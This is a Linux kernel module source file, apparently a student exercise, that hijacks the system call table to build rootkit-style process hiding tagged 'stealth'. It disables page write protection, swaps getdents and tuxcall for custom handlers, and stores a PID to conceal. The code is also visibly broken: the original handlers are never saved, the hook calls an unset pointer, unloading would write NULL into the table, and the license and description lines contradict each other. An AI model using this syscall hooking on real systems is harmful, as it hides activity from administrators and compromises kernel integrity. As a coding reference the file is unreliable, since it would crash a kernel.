/*
 * syscall.c for lkm_syscall
 *
 * Framework by xsyann
 * Framework updated by Yuan Xiao
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Josh & RJ");
MODULE_DESCRIPTION("Loadable Kernel Module Syscall");
MODULE_VERSION("0.1");

#define SYS_CALL_TABLE "sys_call_table"
#define SYSCALL_NI __NR_tuxcall
#define SYSCALL_GD __NR_getdents
#define TAG "stealth"

static ulong *syscall_table = NULL;
static void *original_syscall = NULL;
static void *original_syscall_getdents = NULL;
static char hidden_pid[16];
static char buffer[32768];

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

typedef int (*getdents)(unsigned int, struct linux_dirent *, unsigned int);

static unsigned long lkm_syscall_hide(int pid)
{
    printk("%s: Hiding PID %i\n", TAG, pid);
    sprintf(hidden_pid, "%i", pid);
    return 0;
}

static int lkm_syscall_getdents(unsigned int fd,
        struct linux_dirent *dirp, unsigned int count)
{
    int ret, offset;
    struct linux_dirent *loc_dirp, *dir;
    char *offset_buffer;

    ret = ((getdents)original_syscall)(fd, dirp, count);

    if (copy_from_user(buffer, dirp, 32768) != 0)
    {
        return -EFAULT;
    }

    offset = 0;
    loc_dirp = (struct linux_dirent *)buffer;

    while (offset < ret)
    {
        offset_buffer = ((char*)loc_dirp) + offset;
        dir = (struct linux_dirent *)offset_buffer;
        printk("%s: local_dirp[i] = %s\n", TAG, dir->d_name);
        offset += dir->d_reclen;
    }

    return ret;
}

static int is_syscall_table(ulong *p)
{
    return ((p != NULL) && (p[__NR_close] == (ulong)sys_close));
}

static int page_read_write(ulong address)
{
    uint level;
    pte_t *pte = lookup_address(address, &level);

    if (pte->pte &~ _PAGE_RW) {
        pte->pte |= _PAGE_RW;
    }
    return 0;
}

static int page_read_only(ulong address)
{
    uint level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte = pte->pte &~ _PAGE_RW;
    return 0;
}

static void replace_syscall(ulong offset, ulong func_address, void *old_func)
{
    syscall_table = (ulong *)kallsyms_lookup_name(SYS_CALL_TABLE);

    if (is_syscall_table(syscall_table)) {
        printk(KERN_INFO "%s: Syscall table address : %p\n", TAG, syscall_table);
        page_read_write((ulong)syscall_table);
        old_func = (void *)(syscall_table[offset]);
        printk(KERN_INFO "%s: Syscall at offset %lu : %p\n", TAG, offset,
                original_syscall);
        printk(KERN_INFO "%s: Custom syscall address %p\n", TAG,
                (void*)func_address);
        syscall_table[offset] = func_address;
        printk(KERN_INFO "%s: Syscall hijacked\n", TAG);
        printk(KERN_INFO "%s: Syscall at offset %lu : %p\n", TAG, offset,
                (void *)syscall_table[offset]);
        page_read_only((ulong)syscall_table);
    }
}

static int init_syscall(void)
{
    printk(KERN_INFO "%s: Custom syscall loaded\n", TAG);
    replace_syscall(SYSCALL_GD, (ulong)lkm_syscall_getdents,
            &original_syscall_getdents);
    replace_syscall(SYSCALL_NI, (ulong)lkm_syscall_hide,
            &original_syscall);
    return 0;
}

static void cleanup_syscall(void)
{
    page_read_write((ulong)syscall_table);
    syscall_table[SYSCALL_NI] = (ulong)original_syscall;
    syscall_table[SYSCALL_GD] = (ulong)original_syscall_getdents;
    page_read_only((ulong)syscall_table);
    printk(KERN_INFO "%s: Syscall at offset %d : %p\n", TAG, SYSCALL_NI,
            (void *)syscall_table[SYSCALL_NI]);
    printk(KERN_INFO "%s: Custom syscall unloaded\n", TAG);
}

module_init(init_syscall);
module_exit(cleanup_syscall);

MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("A kernel module to list process by their names");
